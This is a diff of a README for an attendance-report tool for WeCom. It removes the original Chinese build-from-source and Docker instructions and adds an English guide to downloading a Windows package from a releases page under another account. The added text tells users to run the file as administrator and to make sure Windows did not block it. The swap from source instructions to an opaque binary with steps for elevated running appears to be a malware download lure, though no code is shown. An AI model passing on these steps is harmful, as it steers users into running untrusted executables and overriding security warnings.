@@ -1,149 +1,147 @@
-# 考勤报表生成系统 | WeCom Attendance Automation【“内置示例数据，支持 1 分钟快速上手体验”】
+# 📊 WeCom-Attendance-Reporter - Clear Attendance Reports Fast
 
-企业微信考勤导出数据的可视化与考勤统计报表自动生成工具。上传企微管理端导出的上下班打卡日报 `.xlsx` 文件，一键生成标准格式的考勤数据统计报表和周内加班统计报表，可作为加班费计算辅助工具。输入输出文件见 examples 中的示例文件。
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/edwinra6693/WeCom-Attendance-Reporter/releases)
 
-> WeCom attendance report automation — upload punch-clock daily reports, generate formatted attendance & overtime Excel sheets in one click.
+## 🧭 What This App Does
 
-![Demo](assets/demo.gif)
+WeCom-Attendance-Reporter helps you turn WeCom attendance data into a clear report. It reads daily punch records, counts overtime, and shows the result in a simple view. It is built for HR teams and office users who want to skip manual calculations.
 
-## 功能特性
+## 📥 Download the App
 
-- **数据导入** — 拖拽上传企微/钉钉导出的打卡日报 Excel 文件，自动解析
-- **数据预览** — 分页查看考勤概况和打卡详情，支持按姓名、部门、日期筛选
-- **考勤报表导出** — 基于模版生成考勤数据统计报表（含明细 + 汇总两个 Sheet）
-- **加班报表导出** — 生成周内加班统计报表，按 20:00-22:00 / 22:00 之后两个时段统计
-- **动态适配** — 自动提取数据中的年月，支持任意月份；人员数量动态扩展
-- **部门过滤** — 支持按部门关键词筛选导出
+Go to the [Releases page](https://github.com/edwinra6693/WeCom-Attendance-Reporter/releases) to download and run this file on Windows.
 
-## 技术栈
+On the releases page, look for the latest version. Download the Windows package that matches your system. After the download finishes, open the file and follow the steps below.
 
-| 层 | 技术 |
-|---|------|
-| 前端 | Vue 3 + Element Plus + Vite |
-| 后端 | FastAPI + Pandas + OpenPyXL |
-| 部署 | Docker Compose + Nginx |
+## 🖥️ What You Need
 
-## 快速开始
+Use a Windows PC with:
 
-### 环境要求
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A screen set to 1366 × 768 or higher
+- A modern browser if the app opens in a web window
 
-- Python 3.11+
-- Node.js 20+ (推荐 22)
+For the best result, use a stable network connection when you first set it up.
 
-### 本地开发
+## 🚀 Install and Start
 
-```bash
-# 启动后端
-cd backend
-pip install -r requirements.txt
-python main.py
-# API 运行在 http://localhost:8000
-# API 文档: http://localhost:8000/docs
+1. Open the [Releases page](https://github.com/edwinra6693/WeCom-Attendance-Reporter/releases).
+2. Find the newest release at the top of the page.
+3. Download the Windows package from that release.
+4. If the file comes in a `.zip` folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose **Run** or **Yes**.
+8. Wait for the app window to open.
 
-# 启动前端
-cd frontend
-npm install
-npm run dev
-# 前端运行在 http://localhost:5173
-```
+If the app opens in a browser page, keep that page open while you use it.
 
-### Docker 部署
+## 🗂️ Prepare Your Attendance Data
 
-```bash
-docker-compose up -d --build
-# 访问 http://localhost:8082
-```
+Before you make a report, get your WeCom attendance export file ready.
 
-## 使用流程
+Use a file that contains:
 
-```
-导出日报 (.xlsx) → 上传解析 → 数据预览 → 导出报表
-```
+- Daily punch records
+- Employee names
+- Attendance dates
+- Check-in and check-out times
+- Overtime or extra work data, if available
 
-1. 从企微/钉钉管理后台导出「上下班打卡日报」Excel 文件
-2. 在系统「数据导入」页面上传文件
-3. （可选）在「数据预览」页面查看和筛选数据
-4. 在「报表导出」页面按需生成考勤统计或加班统计报表
+Keep the file in a folder you can find easily, such as **Downloads** or **Desktop**.
 
-## 数据源格式
+## 📝 Make a Report
 
-上传的 `.xlsx` 文件需包含以下两个 Sheet：
+1. Open WeCom-Attendance-Reporter.
+2. Choose the attendance file you want to process.
+3. Select the report period, such as a week or a month.
+4. Start the report generation process.
+5. Wait while the app reads the data and builds the report.
+6. Check the preview to see attendance, overtime, and daily totals.
+7. Save or export the report when the data looks correct.
 
-| Sheet | 内容 |
-|-------|------|
-| 概况统计与打卡明细 | 每人每天一条记录：考勤结果、异常统计、假勤统计等 |
-| 打卡详情 | 每次打卡一条记录：实际打卡时间、打卡状态、打卡地点等 |
+The app is built to show the data in a clear format so you can review it before you share it.
 
-`examples/` 目录下提供了示例数据文件供参考。
+## 👀 What You Can Check in the Preview
 
-## 项目结构
+The preview helps you review the report before you send it out. You can use it to check:
 
-```
-├── backend/
-│   ├── main.py              # FastAPI 入口
-│   ├── config.json           # 考勤符号映射配置
-│   ├── routers/              # API 路由
-│   │   ├── upload.py         # 文件上传
-│   │   ├── data.py           # 数据查询
-│   │   └── export.py         # 报表导出
-│   ├── services/             # 业务逻辑
-│   │   ├── parser.py         # Excel 解析
-│   │   ├── attendance.py     # 考勤报表生成
-│   │   └── overtime.py       # 加班报表生成
-│   └── tests/                # 单元测试
-├── frontend/
-│   ├── src/
-│   │   ├── views/            # 页面组件
-│   │   ├── api/              # API 调用
-│   │   └── router/           # 路由配置
-│   └── vite.config.js
-├── 资料/                      # 报表模版文件
-├── examples/                  # 示例数据
-├── docker-compose.yml
-└── deploy_report_project.sh   # 部署脚本
-```
+- Late arrivals
+- Early leave
+- Missing punch records
+- Overtime hours
+- Daily work totals
+- Staff attendance trends
 
-## 配置说明
+This makes it easier to spot problems before you hand the report to your team.
 
-### 考勤符号映射
+## 🧩 Common Use Cases
 
-编辑 `backend/config.json` 中的 `attendance_symbols` 字段可自定义考勤状态与符号的映射关系：
+Use this tool when you need to:
 
-```json
-{
-  "attendance_symbols": {
-    "正常": "√",
-    "迟到": "※",
-    "早退": "◇",
-    "旷工": "×",
-    "事假": "○",
-    "病假": "☆"
-  }
-}
-```
+- Build monthly attendance reports
+- Review overtime for payroll
+- Check missing punch records
+- Prepare HR attendance summaries
+- Share a clean report with managers
+- Reduce time spent on manual counting
 
-### 加班时段配置
+## 🛠️ If the App Does Not Open
 
-```json
-{
-  "overtime_thresholds": {
-    "period1_start": "20:00",
-    "period1_end": "22:00",
-    "period2_start": "22:00"
-  }
-}
-```
+If nothing happens after you double-click the file:
 
-## API 端点
+1. Right-click the app file.
+2. Choose **Run as administrator**.
+3. Check that Windows did not block the file.
+4. Make sure you extracted the full ZIP folder first.
+5. Try downloading the release again.
+6. Close other apps that use a lot of memory.
 
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| POST | `/api/upload` | 上传打卡日报文件 |
-| GET | `/api/data/overview` | 分页查询考勤概况 |
-| GET | `/api/data/details` | 分页查询打卡详情 |
-| POST | `/api/export/attendance` | 导出考勤统计报表 |
-| POST | `/api/export/overtime` | 导出加班统计报表 |
+If the file opens but shows no data, check that your attendance export file is in the correct format and try again.
 
-## License
+## 📄 Working With Excel Files
 
-MIT
+This app uses spreadsheet-style data for reporting. That means it works well with files that contain rows, columns, dates, and time values.
+
+Best results come from files that:
+
+- Use clear column names
+- Keep one employee per row or record
+- Use a consistent date format
+- Avoid merged cells
+- Do not contain empty header rows
+
+If your export comes from WeCom, save it without changing the structure unless you know the fields your report needs.
+
+## 🔒 Privacy and Local Use
+
+The app is meant for local use on your computer. That means you keep control of the files you open and the reports you create. Store your attendance files in a safe place and share reports only with the people who need them.
+
+## 📌 File Names and Folder Tips
+
+Use simple file names such as:
+
+- `attendance-april.xlsx`
+- `wecom-daily-report.xlsx`
+- `overtime-summary-may.xlsx`
+
+Keep your files in one folder so you can find them later. This also helps when you need to make a new report for the next month.
+
+## ❓ Useful Checks Before You Start
+
+Before you generate a report, make sure:
+
+- Your file is the latest export
+- The date range is correct
+- Employee names are spelled the same way throughout the file
+- Times are entered in a proper clock format
+- The file is not open in Excel when you use it in the app
+
+## 💬 What This Project Is For
+
+WeCom-Attendance-Reporter is made for office attendance work. It fits teams that use WeCom and need a simple way to turn raw punch data into a readable report. It brings together FastAPI on the backend and Vue 3 on the front end, so the app can process data and show results in a clear view.
+
+## 🔍 Search Terms
+
+attendance, enterprise wechat, fastapi, hr tools, oa, office automation, openpyxl, overtime statistics, pandas, python, reporting tool, vue3, wecom
